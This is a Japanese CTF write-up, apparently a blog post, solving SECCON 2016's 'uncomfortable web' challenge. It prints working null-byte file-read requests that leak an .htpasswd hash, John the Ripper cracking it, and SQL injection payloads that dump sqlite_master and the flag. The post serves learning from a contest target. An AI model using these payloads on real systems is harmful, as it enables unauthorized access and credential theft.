---
layout: post
redirect_from:
  - /writeup/ctf/2016/seccon-2016-online-uncomfortable-web/
  - /blog/2016/12/11/seccon-2016-online-uncomfortable-web/
date: "2016-12-11T22:52:05+09:00"
tags: [ "ctf", "writeup", "seccon", "web", "sql-injection", "null-byte-attack", "htaccess", "htpasswd", "sqlite" ]
"target_url": [ "https://score-quals.seccon.jp/question/1707d3814069dec8ca49947830e3a51fdff4714b" ]
---

# SECCON 2016 Online CTF: uncomfortable web

本番ではそもそも開かず。生きてるweb問は貴重なので早めに復習。

## problem

適当な言語でscriptをuploadすると、remoteで実行してくれるサービス。
そこから繋がる `http://127.0.0.1:81/` にflagがあるので探す問題。

## solution

まず、scriptをwebからuploadして確認するのは煩雑である。以下のようにする。

``` sh
#!/bin/bash
atexit() { [ -n $tmpfile ] && rm -f "$tmpfile" ; }
tmpfile=`mktemp --suffix=.sh`
trap atexit EXIT
trap 'trap - EXIT; atexit; exit -1' SIGHUP SIGINT SIGTERM
cat <<EOF > $tmpfile
#!/bin/sh
echo
echo --------
echo
echo
echo

curl http://127.0.0.1:81/

echo
echo
echo
echo --------
echo
EOF
curl http://uncomfortableweb.pwn.seccon.jp/\? -F file=@$tmpfile | sed 's/&lt;/</g ; s/&gt;/>/g ; s/&quot;/'\''/g ; s/&amp;/\&/g'
```


`http://127.0.0.1:81/`ではディレクトリが見える。

```
Index of /

[ICO]           Name            Last modified   Size            Description
[DIR]           authed/         28-Nov-2016 10:51               -                
[TXT]           select.cgi      28-Nov-2016 10:08               612              
Apache Server at 127.0.0.1 Port 81
```

`/authed`にはbasic認証がある。
`/select.cgi`は以下のような出力をする。

``` html
<html>
<body>
<form action='?' method='get'>
<select name='txt'>
<option value='a'>a</option>
<option value='b'>b</option>
</select>
<input type='submit' vaue='GO'>
</form>
</body></html>
```

例えば `curl http://127.0.0.1:81/select.cgi?txt=a` とすると以下のように、`/authed/${txt}.txt`を読んでくれる。

``` html
<html>
<body>
<form action='?' method='get'>
<select name='txt'>
<option value='a'>a</option>
<option value='b'>b</option>
</select>
<input type='submit' vaue='GO'>
</form>
<hr>
authed/a.txt<br>
<br>
                       /$$     /$$                       /$$       /$$            /$$                /$$    <br>
                      | $$    | $$                      | $$      /$$/           | $$               | $$    <br>
  /$$$$$$  /$$   /$$ /$$$$$$  | $$$$$$$   /$$$$$$   /$$$$$$$     /$$//$$$$$$    /$$$$$$  /$$   /$$ /$$$$$$  <br>
 |____  $$| $$  | $$|_  $$_/  | $$__  $$ /$$__  $$ /$$__  $$    /$$/|____  $$  |_  $$_/ |  $$ /$$/|_  $$_/  <br>
  /$$$$$$$| $$  | $$  | $$    | $$  \ $$| $$$$$$$$| $$  | $$   /$$/  /$$$$$$$    | $$    \  $$$$/   | $$    <br>
 /$$__  $$| $$  | $$  | $$ /$$| $$  | $$| $$_____/| $$  | $$  /$$/  /$$__  $$    | $$ /$$ &gt;$$  $$   | $$ /$$<br>
|  $$$$$$$|  $$$$$$/  |  $$$$/| $$  | $$|  $$$$$$$|  $$$$$$$ /$$/  |  $$$$$$$ /$$|  $$$$//$$/\  $$  |  $$$$/<br>
 \_______/ \______/    \___/  |__/  |__/ \_______/ \_______/|__/    \_______/|__/ \___/ |__/  \__/   \___/  <br>
<br>
<br>
</body></html>
```

ここでnull-byte attackができて、`curl http://127.0.0.1:81/select.cgi?txt=a.txt%00`で上と同じ結果が得られる。

これを使って`/authed`の認証情報を取りにいく。つまり`.htaccess` `.htpasswd`を読む。
`curl http://127.0.0.1:81/select.cgi?txt=.htpasswd%00` とすると

```
keigo:LdnoMJCeVy.SE
```

と得られる。passwordは暗号化されているが、これは John the Ripper で破れる。(たぶんbruteforceしてる。)

``` sh
$ cat .htpasswd
keigo:LdnoMJCeVy.SE

$ john .htpasswd
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
Press 'q' or Ctrl-C to abort, almost any other key for status
test             (keigo)
1g 0:00:00:00 100% 2/3 33.33g/s 30733p/s 30733c/s 30733C/s orange..horses
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`curl --user keigo:test http://127.0.0.1:81/authed/sqlinj/` として見る。
以下のように並んでいる。

```
[DIR]           Parent Directory                                -                
[TXT]           1.cgi           28-Nov-2016 11:41               750              
[TXT]           2.cgi           28-Nov-2016 11:41               750              
[TXT]           3.cgi           28-Nov-2016 11:41               750              
[TXT]           4.cgi           28-Nov-2016 11:41               750              
[TXT]           5.cgi           28-Nov-2016 11:41               750              
[TXT]           6.cgi           28-Nov-2016 11:41               750              
[TXT]           7.cgi           28-Nov-2016 11:41               750              
...
[TXT]           98.cgi          28-Nov-2016 11:41               750              
[TXT]           99.cgi          28-Nov-2016 11:41               750              
[TXT]           100.cgi         28-Nov-2016 11:41               750              
```

どれも以下のようなもので、

``` html
<html>
<head>
  <title>SECCON 2016 Online</title>
  <!-- by KeigoYAMAZAKI, 2016.11.08- -->
</head>
<body>
<a href='?no=4822267938'>link</a>
</body></html>
```

`http://127.0.0.1:81/authed/sqlinj/1.cgi?no=4822267938`とすると以下のように検索結果が返る。

``` html
<html>
<head>
  <title>SECCON 2016 Online</title>
  <!-- by KeigoYAMAZAKI, 2016.11.08- -->
</head>
<body>
<a href='?no=4822267938'>link</a>
<hr>
ISBN-10: 4822267938<br>
ISBN-13: 978-4822267933<br>
PUBLISH: 2016/2/19<p>
</body></html>
```

`1.cgi`には刺さらないが、$100$ある内のいずれかにSQLiが刺さると踏んで、

``` sh
for i in \`seq 100\` ; do
    curl --user keigo:test http://127.0.0.1:81/authed/sqlinj/\$i.cgi?no=$(urlencode " ' or 1 = 1 -- ")
done
```

とすると`72.cgi`がそれ。

適当にsqliteと判断して`sqlite_master`を見る。
これは`by KeigoYAMAZAKI`という作問者情報からでも分かるらしい。

``` sh
curl --user keigo:test http://127.0.0.1:81/authed/sqlinj/72.cgi?no=$(urlencode " ' union select type, name, sql from sqlite_master -- ")
```

``` html
<html>
<head>
  <title>SECCON 2016 Online</title>
  <!-- by KeigoYAMAZAKI, 2016.11.08- -->
</head>
<body>
<a href='?no=4822267938'>link</a>
<hr>
ISBN-10: table<br>
ISBN-13: books<br>
PUBLISH: CREATE TABLE books (isbn10,isbn13,date)<p>
ISBN-10: table<br>
ISBN-13: f1ags<br>
PUBLISH: CREATE TABLE f1ags (f1ag)<p>
</body></html>
```

よって

``` sh
curl --user keigo:test http://127.0.0.1:81/authed/sqlinj/72.cgi?no=$(urlencode " ' union select f1ag, 1, 1 from f1ags -- ")
```

``` html
<html>
<head>
  <title>SECCON 2016 Online</title>
  <!-- by KeigoYAMAZAKI, 2016.11.08- -->
</head>
<body>
<a href='?no=4822267938'>link</a>
<hr>
ISBN-10: SECCON{I want to eventually make a CGC web edition... someday...}<br>
ISBN-13: 1<br>
PUBLISH: 1<p>
</body></html>
```
